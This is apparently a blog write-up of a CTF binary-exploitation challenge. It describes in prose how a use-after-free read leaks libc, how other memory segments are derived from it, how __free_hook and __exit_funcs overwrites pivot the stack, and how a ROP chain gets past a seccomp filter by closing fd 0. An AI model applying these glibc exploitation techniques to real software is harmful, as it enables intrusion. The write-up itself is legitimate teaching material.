This was a fun ctf, even though I spent most of my time on a single challenge (called 'useless crap'). I learned a lot doing this challenge, and thought I would make a writeup because as far a I know (from the 2 places I've looked) this is a unique solution to the problem, and has some cool tricks.

<!--more-->

## The challenge

From the challenge page we get 3 files- the binary (called `crap`), a libc (version 2.31) and a dynamic linker/loader ld-2.31.so. By running patchelf we see there's another needed library, libseccomp. 

```
$ patchelf --print-needed ./crap
libseccomp.so.2
libc.so.6
```

I already had this library in /lib64/, and put a copy in the challenge directory. I used patchelf to set all the needed libraries/linker in order to run the binary

```
$ patchelf --add-needed ./libseccomp.so.2 ./crap
$ patchelf --add-needed ./libc-2.31.so ./crap
$ patchelf --set-interpreter ./ld-2.31.so ./crap
```

After checking the protections enabled with `checksec`, it looks like this is a 64bit binary with everything enabled:

![checksec](/assets/images/tghack2020/checksec.jpg)

When we run the binary, we get a simple menu with 3 options

```
$ ./crap
1. read
2. write
3. exit
>
```

I then opened up the binary in the [cutter](https://github.com/radareorg/cutter) disassembler to look at what the options do. At this point I found 2 more options, accessed by sending '4' and '5'. Here is a summary of what each do:

- 1 read: reads memory at a user supplied address. There is a limit of 2 reads allowed, enforced by checking if a global signed integer is > 1
- 2 write: writes a user supplied value at a user supplied address. Same limit mechanism as read option
- 3 exit: Asks the user for some feedback- first some memory is allocated with `calloc(0x501, 1)` then filled with `fgets`. Additionally, after writing their feedback the user is asked if they want to keep their feedback. If they answer 'n' the feedback buffer is `free()`'d, but *not* set to NULL.
    You can only provide feedback once- this is enforced by checking if the feedback buffer is NULL
- 4 view_feedback: calls `printf("%s")` on the feedback buffer
- 5 actual `exit()`

It's nice that the challenge gives us arbitrary r/w for free, now we need some address leaks to work with.

Because of its size, the allocated feedback chunk is placed into the unsorted bin when `free()`'d. This means that its forward and backward pointers will point inside of `main_arena` (+96) in libc. These pointers are written where the user data used to be in the heap chunk, so if we send menu option '4' to view the feedback after freeing it `printf("%s")` is called on one of these pointers, and so we can read the address of `main_arena+96` and use that to obtain the base of libc.

There's a lot you can do with a libc leak + an arbitrary read, like leaking the address of every other segment in the process memory.

<br>

## Leaking every segment from libc

### .text

If you look at the binary in gdb and run `vmmap`, you will see that the dynamic linker/loader `ld` program has its own segment in memory. The value the .text segment is loaded in at will be stored in this segment.

If you want to check, find the value of the binary base in your gdb session using `vmmap`, then use the search functionality (`search` in pwndbg or `search-pattern` in gef) to search for this value in memory. If found, it will probably be in this ld.so section

What does this mean? The way ASLR is currently implemented (on Linux) is the shared libraries are grouped in a single 'block', and only the start of this block is randomised, not the start of each individual shared library. This means the offset from the base of libc to any point in the shared library block (which includes the ld.so segment) will be constant.

So all we have to do is calculate the offset from the base of libc to the address where the binary base value is stored (in the ld.so segment) and read there. We've now leaked the .text segment address and defeated PIE

### heap

`main_arena` will have heap pointers, so you can perform a read there to leak a heap address.

For the ctf challenge, reading at the leak we are given (`main_arena+96`) will give us a heap address.

### stack

There is a pointer to the `char **envp` argument to `main` inside libc. In pwntools, the offset to this can be obtained with `libc.symbols['environ']`. Reading here will give us a stack leak, defeating ASLR.

This stack leak isn't used in the challenge, but it's cool to know about.

<br>

## libseccomp

There was another function call in the challenge I haven't mentioned yet- in `main` there is a call to a function called `sandbox`, which calls some libseccomp functions. If you manage to call something like `system("/bin/sh")` you would hit a SIGSYS signal, "bad system call" (I tried it)

[libseccomp](https://github.com/seccomp/libseccomp) is an API to the kernel's Berkeley Packet Filter syscall filtering mechanism. Basically, it abstracts the filter language away into a function call based interface and can be used to do things like whitelist which syscalls are allowed and which file descriptions can be read from/written to.

[seccomp-tools](https://github.com/david942j/seccomp-tools) is a nice tool that can dump the filter rules for seccomp sandboxes. Running it on the challenge binary, we see the following:

![seccomptools](/assets/images/tghack2020/seccomptools.jpg)

The `open`, `close`, `mprotect`, and `exit_group` syscalls are allowed without conditions, while `read` and `write` have some checks on the file descriptor used- specifically, you can only read from fd 0 (stdin) and write to fd 0 and 1 (stdin and stdout)

Trying to execute other syscalls like `execve` will result in a SIGSYS signal stopping the program.

## Solving the challenge

After leaking libc by reading the feedback chunk, we use the 'read' option in the menu to read inside the ld.so segment and get a .text leak, as described above.

We can then calculate the address of the integer used for keeping track of write counts and use the 'write' menu option to set this value some negative number, effectively giving us infinite arbitrary writes. Now what?

We _could_ set the feedback buffer pointer to NULL, write over `__malloc_hook`/`__free_hook` and call the set_feedback function again to trigger a `malloc`/`free` call, but what would we put over the hook? A one_gadget wouldn't work since `execve` is disabled, so it seems like we can't use this option right now.

We can get `exit()` called, and I knew that overwriting the `__exit_funcs` variable in libc did... _something_ during `exit()`. On a whim I went with this to see what would happen.

First lets look at the disassembly for `exit()` to get an idea of what would happen

![exit](/assets/images/tghack2020/exit.jpg)

This loads `__exit_funcs` as one of the arguments to `__run_exit_handlers` ([source](https://code.woboq.org/userspace/glibc/stdlib/exit.c.html)), which does the actual heavy lifting. `__exit_funcs` is treated as a list of functions to be called, and is normally populated by calling functions like `atexit()`, and by default contains a pointer that points to `NULL`. We can't use this variable to get code execution because of [pointer guard](https://sourceware.org/glibc/wiki/PointerEncryption]), which obfuscates the function pointers used in this function.

![pointerguard](/assets/images/tghack2020/pointerguard.jpg)

However, looking at the source code for `__run_exit_handlers` there is a call to `free()` in the function execution loop. We could get code execution using `__free_hook` if we reach this (full disclaimer, I didn't think about using the hooks discussed previously in `set_feedback` during the challenge, so I thought calling free from `__run_exit_handlers` was the only way to reach `__free_hook`, however this turned out to be to my benefit).

![free](/assets/images/tghack2020/free.jpg)

If we point the `__exit_funcs` variable to our feedback chunk in the heap (which we know the location of because of the heap leak) we might have some control over how `__run_exit_handlers` executes. I did this and called `exit()` from the menu

Some amount of dynamic analysis later I found that if you point `__exit_funcs` to memory containing 8 bytes of arbitrary data followed by 8 bytes of zeroes (a NULL ptr) you will hit the call to `free()`, with some particularly interesting values in the registers:

![regs](/assets/images/tghack2020/regs.jpg)

Of particular interest is `$rbp`- it points to the `__exit_funcs` variable in libc (which was set to point to our heap chunk, but at some point in `__run_exit_handlers` this was changed- ultimately this doesn't matter). At this point I thought some sort of stack pivot into libc might be possible so I searched for gadgets, and managed to find this:

![gadget](/assets/images/tghack2020/gadget.jpg)

This is the magic gadget that allowed me to solve the challenge- `$rsp` is set above `$rbp` but we pop 3 times, ending up with `$rsp` pointing to the value right after `__exit_funcs`. This is still in a rw segment and we effectively have infinite writes, so we can place a ROP chain here.

Quick recap on how we got here:

- Provide feedback such that we have 8 bytes of arbitrary data followed by 8 bytes of zeroes somewhere in the heap chunk- note this should be atleast after 0x20 bytes of arbitrary data since `free()` will overwrite some user data
- `free()` the chunk and read the feedback to get a libc leak
- Use the libc leak + arbitrary read to leak the .text segment and the heap address
- Write over the write count with some large negative number to get infinite writes
- Write over `__free_hook` with our stack pivot gadget
- Write over `__exit_funcs` with a pointer to our heap data
- Call `exit()` with menu option '5'-> `__run_exit_handlers` is called -> `free()` + `__free_hook` is called-> pivot gadget triggers and we `ret` to whatever address is stored right after `__exit_funcs`.

### ROP chain

So we have the ability to return to a ROP chain, but what do we do? Looking back at the seccomp rules, we can't call execve to get a shell. We could open the flag file, but its assigned file descriptor won't be 0 so we can't read from it.

We DO have access to the `close` syscall however, so we can just close fd 0! If we call `open` after that to open the flag file, it will be assigned fd 0, which we can read from according to the seccomp rules. After that it's a simple matter of reading the flag into a buffer and writing it to stdout- challenge solved.

I only managed to solve this locally, I couldn't figure out what wasn't working on the remote server- maybe some wrong offset somewhere. Still a fun challenge, which I learned a lot from
